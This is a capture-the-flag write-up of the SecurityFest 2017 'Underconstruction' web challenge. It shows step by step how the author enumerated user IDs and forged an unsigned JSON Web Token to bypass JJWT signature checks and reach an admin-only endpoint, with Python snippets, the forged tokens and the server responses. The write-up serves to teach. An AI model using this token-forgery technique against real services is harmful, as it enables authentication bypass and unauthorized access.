---
layout: post
title: "SecurityFest 2017: Underconstruction (Web 200)"
author: verr
categories: writeup
tags: [cat/web, tool/python, lang/java, tech/jwt, tech/jjwt]
---

* **Category:** Web
* **Points:** 200
* **Solves:** 12
* **Description:**

>  Under Construction! Please protect your head, wear a hardhat.
>  
>  Service: http://web.ctf.rocks:8080 

## Write-up

This challenge was a weird one. Initial recon (favicon, error page) told us that we are dealing with Spring, but not much more. A hint in the `HTML` source was the beginning of our journey:

>  <!-- I don't know the status of the front end but the back end is coming along nicely. Try /login with {"username": "user", "password":"password"} -->

### Logging in

Since `/login` displayed an empty white page, and `GET`ing or `POST`ing the given credentials to it did not change anything (header, cookies, content), we used our beloved [requests](http://docs.python-requests.org/) to fire some non-form-encoded json directl at the endpoint (which [is supported by requests](http://docs.python-requests.org/en/master/user/quickstart/#more-complicated-post-requests)):

```python
data = {"username": "user", "password": "password"}
r = s.post(LOGIN, json=data)
```

which happily returned the following page content:

```
{"userId":"52","authorizedURLs":["/login","/apis"]}
```

and no cookies, but the following headers:

```
{ ...
 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzEzNTgzM30.5oR_EfmqpBU_m3OYMToeyZVkycn_s42gjVjxc7ZUlX0'
... }
```

The `Authorization` header basically contains a signed [JSON Web Token](https://jwt.io/) holding the following payload:

```json
{
  "user": "user",
  "exp": 1497135833
}
```

This confirms that we are now logged in as user `user`. Keep that in mind for later.

### Looking around

The `authorizedURLs` field mentioned above tells us that there is another endpoint called `/apis`, which is the next step on our journey. Let's chat with it.

```python
r = s.get(URL + 'apis')
```

Yields:

```json
{"timestamp":1496272249731,
"status":400,
"error":"Bad Request",
"exception":"org.springframework.web.bind.MissingServletRequestParameterException",
"message":"Required Integer parameter 'userId' is not present",
"path":"/apis"}
```

Okay, we know from above that our `userId` is 52, so let us iterate over the first 100 or so ids ...

```python
for i in range(0, 100):
    payload = {"userId": i}
    r = s.get(URL + 'apis', params=payload)
    print r.text
```

Now that was a waste of LOC, since id 0 is the interesting one:

```json
{"urls":["/login","/apis","/supersecretflagresource"],
"id":0,
"user":"admin"}
```

Hello there! Yet another endpoint. The end is near ... 

```python
r = s.get(URL + 'supersecretflagresource')
```

But not so fast ...

```json
{"timestamp":1496272451108,
"status":403,
"error":"Forbidden",
"message":"Access is denied",
"path":"/supersecretflagresource"}
```

### Elevation of Privilege

Since the endpoint is associated to the `admin` user, we figure that we need to login as admin. But how? We don't know the password. Should we try SQLi now? Wait. Remember the JSON Web Token from earlier?

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTQ5NzEzNjQ1MX0.hoR2PKa1opg63MzTmNBkqbTPK9RZRoxhJeox7_HnEx0
```

Maybe the validation is crap and we can simply replace the payload?

```json
{
  "user": "admin",
  "exp": 1497136451
}
```

Copying the header and signature from the original token, we get:

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcxMzY0NTF9.hoR2PKa1opg63MzTmNBkqbTPK9RZRoxhJeox7_HnEx0
```

Let us send that to the server ...

```json
{"timestamp":1496272770574,
"status":500,
"error":"Internal Server Error",
"exception":"io.jsonwebtoken.SignatureException",
"message":"JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.",
"path":"/supersecretflagresource"}
```

Well, at least we now know that they are probably using *Java JWT* (`JJWT`) on the server to parse & validate the tokens.

Hours later, we still did not manage to validate our manipulated json, but while reading the [DefaultJwtParser](https://github.com/jwtk/jjwt/blob/master/src/main/java/io/jsonwebtoken/impl/DefaultJwtParser.java#L201) code (we guessed from some exceptions that they are using this one), we noticed something:

```java
if (base64UrlEncodedDigest != null) { //it is signed - validate the signature
    ...
}

```

What do you mean? Does this mean if no digest is present in the token, you simply do not validate anything but still accept the token? What the hell?

Can this be true? Let us try with the following token (the trailing dot needs to be there, since they literally count the dots) ...

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcxMzY0NTF9.
```

Yielding ...

```json
{"timestamp":1496273207665,
"status":500,
"error":"Internal Server Error",
"exception":"io.jsonwebtoken.exception.HeaderWithoutSignatureException","message":"JWT string is missing a signature.",
"path":"/supersecretflagresource"}
```

Oh, thank you friendly exception, thanks for letting us know. One more try with this token (note the leading dot) ...

```
.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE0OTcxMzY0NTF9.
```

And here we go:

```json
{"message":"You are close now",
"script":"function getFlag() {   var text = $('.c-intro').innerText;   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';}",
"url":"https://kits.se?kokitotsos"}
```

Since it appeared weird to us that this was possible with an actual library (likely in the most up to date version), we did some more research to figure out what actually happened. Reading closed issues on GitHub is always a fun thing to do, and apparently the answer by a maintainer to [this issue](https://github.com/jwtk/jjwt/issues/193) did the job:

> Don't call `parse` if you know it is a signed token. Call `parseClaimsJws`.

We think it is a dangerous thing to have the less-secure version as the default.
Other people also [share this opinion](https://github.com/jwtk/jjwt/issues/212), and apparently there is a change on the way.

### The Flag

Retrieving the actual flag after this "trick" was straight forward. Since the website mentioned in the response was in UTF8 encoded Swedish, and UTF8 in Python is never fun, we simply fired up the JavaScript console, pasted the given script, and done.

```javascript
 function getFlag() {
   var text = $('.c-intro').innerText;
   return 'SCTF{' + text.slice(35,38) + text.slice(0,10) + '}';
  }
```

Thanks for the flag & interesting challenge.

`SCTF{lolKOKITOTSOS}`

